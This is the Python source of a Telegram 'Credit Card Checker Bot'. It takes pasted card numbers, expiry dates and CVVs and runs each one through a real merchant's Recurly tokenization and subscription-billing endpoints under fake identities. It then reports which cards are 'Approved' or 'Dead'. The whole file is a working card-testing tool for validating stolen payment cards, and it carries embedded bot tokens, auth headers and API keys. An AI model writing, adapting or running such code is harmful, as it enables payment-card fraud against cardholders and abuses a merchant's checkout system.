import re
import time
import threading
import requests
import telebot

BOT_TOKEN = '7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE'
bot = telebot.TeleBot(BOT_TOKEN)

user_stop_flag = {}
processing_status = {}
user_email_counters = {}

def generate_email(user_id):
    # Initialize counter if not exists
    if user_id not in user_email_counters:
        user_email_counters[user_id] = 2002
    email_num = user_email_counters[user_id]
    user_email_counters[user_id] += 1
    return f"peshangsalam{email_num}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "🔒 Credit Card Checker Bot\n\n"
        "Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "⏳ 15s delay between checks\n"
        "⏹ Use /stop to cancel processing",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹ Processing stopped")

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False
    
    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        email = generate_email(user_id)
        first_name = "Peshang"
        last_name = "Salam"
        
        try:
            # Step 1: Check user
            check_user_url = "https://services.keepingcurrentmatters.com/api/kcmft/v1/check-user"
            headers = {
                "Authorization": "Basic a2NtZnRmb3JtOkxUTXR2YjZtQnlqTGRx",
                "Content-Type": "application/json"
            }
            requests.post(check_user_url, json={"email": email}, headers=headers)

            # Step 2: Get payment token
            token_url = "https://api.recurly.com/js/v1/token"
            token_data = {
                "first_name": first_name,
                "last_name": last_name,
                "number": cc,
                "month": mm,
                "year": yy,
                "cvv": cvv,
                "address1": "198 White Horse Pike",
                "city": "West Collingswood",
                "state": "NJ",
                "postal_code": "08107",
                "country": "US",
                "key": "ewr1-xjjpPJHol9bMZujW5RI1Z2",
                "version": "4.34.0"
            }
            token_response = requests.post(token_url, data=token_data)
            token_json = token_response.json()
            
            if 'id' not in token_json:
                raise Exception("Failed to get payment token")

            payment_token = token_json['id']

            # Step 3: Setup billing
            billing_url = "https://services.keepingcurrentmatters.com/api/kcmft/v1/industries/1/setup-billing"
            billing_data = {
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "payment_token": payment_token,
                "plan_code": "expert-monthly",
                "phone": "3144740104",
                "allow_text": False
            }
            billing_response = requests.post(
                billing_url,
                json=billing_data,
                headers=headers
            )
            response_json = billing_response.json()
            response_text = billing_response.text

            if response_json.get("success") is True and "id" in response_json:
                status = "✅ Approved"
            elif response_json.get("success") is False and response_json.get("message") == "Failed to create purchase":
                status = "❌ Dead"
            else:
                status = "❓ Unknown"

            bot.send_message(
                chat_id,
                f"Card #{idx}\n"
                f"Number: {cc}|{mm}|{yy}|{cvv}\n"
                f"Email: {email}\n"
                f"Status: {status}\n"
                f"Response:\n<code>{response_text}</code>",
                parse_mode="HTML"
            )

        except Exception as e:
            bot.send_message(
                chat_id,
                f"❌ Error processing card #{idx}\n"
                f"{cc}|{mm}|{yy}|{cvv}\n"
                f"Error: {str(e)}"
            )

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    user_id = message.from_user.id
    if processing_status.get(user_id):
        bot.send_message(message.chat.id, "⚠️ Already processing cards, please wait")
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Invalid format. Please send cards as:\n"
            "CC|MM|YY|CVV\nCC|MM|YYYY|CVV\n"
            "CC/MM/YY/CVV\nCC/MM/YYYY/CVV"
        )
        return

    processing_status[user_id] = True
    bot.send_message(message.chat.id, f"🔍 Processing {len(cards)} cards...")

    def process_wrapper():
        check_card_flow(message, cards)
        processing_status[user_id] = False

    threading.Thread(target=process_wrapper).start()

if __name__ == '__main__':
    processing_status = {}
    bot.infinity_polling()